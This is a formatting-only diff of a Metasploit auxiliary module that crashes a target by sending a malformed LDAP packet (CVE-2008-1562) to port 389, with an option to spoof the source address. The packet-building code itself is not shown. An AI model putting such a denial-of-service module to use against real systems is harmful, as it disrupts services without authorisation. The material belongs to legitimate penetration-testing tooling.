@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -6,7 +7,6 @@
 require 'msf/core'
 
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Capture
   include Msf::Auxiliary::Dos
 
@@ -22,20 +22,19 @@ class MetasploitModule < Msf::Auxiliary
       'References'  =>
         [
           [ 'CVE', '2008-1562' ],
-          [ 'OSVDB', '43840' ],
+          [ 'OSVDB', '43840' ]
         ],
       'DisclosureDate' => 'Mar 28 2008')
 
     register_options([
-      OptInt.new('RPORT', [true, 'The destination port', 389]),
-      OptAddress.new('SHOST', [false, 'This option can be used to specify a spoofed source address', nil])
-    ], self.class)
+                       OptInt.new('RPORT', [true, 'The destination port', 389]),
+                       OptAddress.new('SHOST', [false, 'This option can be used to specify a spoofed source address', nil])
+                     ], self.class)
 
-    deregister_options('FILTER','PCAPFILE')
+    deregister_options('FILTER', 'PCAPFILE')
   end
 
   def run
-
     open_pcap
 
     print_status("Sending malformed LDAP packet to #{rhost}")
@@ -55,7 +54,5 @@ class MetasploitModule < Msf::Auxiliary
     capture_sendto(p, rhost)
 
     close_pcap
-
   end
-
 end
